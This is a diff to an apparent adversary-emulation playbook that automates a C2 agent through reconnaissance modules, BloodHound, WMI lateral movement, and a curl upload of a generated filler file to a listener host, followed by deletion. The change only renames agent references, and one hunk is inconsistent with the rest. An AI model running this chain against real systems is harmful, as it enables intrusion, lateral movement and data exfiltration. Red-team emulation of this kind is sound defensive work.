@@ -227,7 +227,7 @@ action "task_execute_command" "execute_stager" {
 
 action "execute_agent_module" "antivirusproduct" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info
     module            = "powershell/situational_awareness/host/antivirusproduct"
     wait_for_results  = true
     completion_string = "completed"
@@ -235,7 +235,7 @@ action "execute_agent_module" "antivirusproduct" {
 
 action "execute_agent_module" "dnsserver" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/situational_awareness/host/dnsserver"
     wait_for_results  = true
     completion_string = "completed"
@@ -244,7 +244,7 @@ action "execute_agent_module" "dnsserver" {
 
 action "execute_agent_module" "get_proxy" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/situational_awareness/host/get_proxy"
     wait_for_results  = true
     completion_string = "completed"
@@ -253,7 +253,7 @@ action "execute_agent_module" "get_proxy" {
 
 action "execute_agent_module" "get_uaclevel" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/situational_awareness/host/get_uaclevel"
     wait_for_results  = true
     completion_string = "completed"
@@ -262,7 +262,7 @@ action "execute_agent_module" "get_uaclevel" {
 
 action "execute_agent_module" "seatbelt_user" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/situational_awareness/host/seatbelt"
     wait_for_results  = true
     completion_string = "completed"
@@ -276,7 +276,7 @@ action "execute_agent_module" "seatbelt_user" {
 
 action "execute_agent_module" "seatbelt_system" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/situational_awareness/host/seatbelt"
     wait_for_results  = true
     completion_string = "completed"
@@ -290,7 +290,7 @@ action "execute_agent_module" "seatbelt_system" {
 
 action "execute_agent_module" "reverse_dns" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/situational_awareness/network/reverse_dns"
     wait_for_results  = true
     completion_string = "completed"
@@ -303,7 +303,7 @@ action "execute_agent_module" "reverse_dns" {
 
 action "execute_agent_module" "portscan" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/situational_awareness/network/portscan"
     wait_for_results  = true
     completion_string = "completed"
@@ -317,7 +317,7 @@ action "execute_agent_module" "portscan" {
 
 action "execute_agent_module" "get_domain_controller" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/situational_awareness/network/powerview/get_domain_controller"
     wait_for_results  = true
     completion_string = "completed"
@@ -326,7 +326,7 @@ action "execute_agent_module" "get_domain_controller" {
 
 action "execute_agent_module" "get_domain_policy" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/situational_awareness/network/powerview/get_domain_policy"
     wait_for_results  = true
     completion_string = "completed"
@@ -335,7 +335,7 @@ action "execute_agent_module" "get_domain_policy" {
 
 action "execute_agent_module" "bloodhound" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/situational_awareness/network/bloodhound"
     wait_for_results  = true
     completion_string = "completed"
@@ -350,7 +350,7 @@ action "execute_agent_module" "bloodhound" {
 
 action "execute_agent_module" "invoke_wmi" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     module            = "powershell/lateral_movement/invoke_wmi"
     wait_for_results  = true
     completion_string = "completed"
@@ -364,14 +364,14 @@ action "execute_agent_module" "invoke_wmi" {
 
 action "execute_agent_shell_command" "create_exfil_file" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     command           = "New-Item ${variable.exfil_path}\\${variable.exfil_file}; while((Get-Item -Path ${variable.exfil_path}\\${variable.exfil_file}).Length/1MB -le ${variable.exfil_size}){\"1234567890qwertyasdfjkl;\"*1048576 >> ${variable.exfil_path}\\${variable.exfil_file}}"
     depends_on        = action.execute_agent_module.invoke_wmi
 }
 
 action "execute_agent_shell_command" "upload_exfil_file" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     command           = "c:\\Windows\\System32\\curl.exe -k -F file=@${variable.exfil_path}\\${variable.exfil_file} https://${resource.listener.exfil_listener.host_name}.${resource.listener.exfil_listener.domain_name}:443/p"
     wait_for_results  = true
     depends_on        = action.execute_agent_shell_command.create_exfil_file
@@ -379,7 +379,7 @@ action "execute_agent_shell_command" "upload_exfil_file" {
 
 action "execute_agent_shell_command" "delete_exfil_file" {
     task_name         = resource.task.c2_task.task_name
-    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_name
+    agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
     command           = "del ${variable.exfil_path}\\${variable.exfil_file}"
     wait_for_results  = true
     depends_on        = action.execute_agent_shell_command.upload_exfil_file
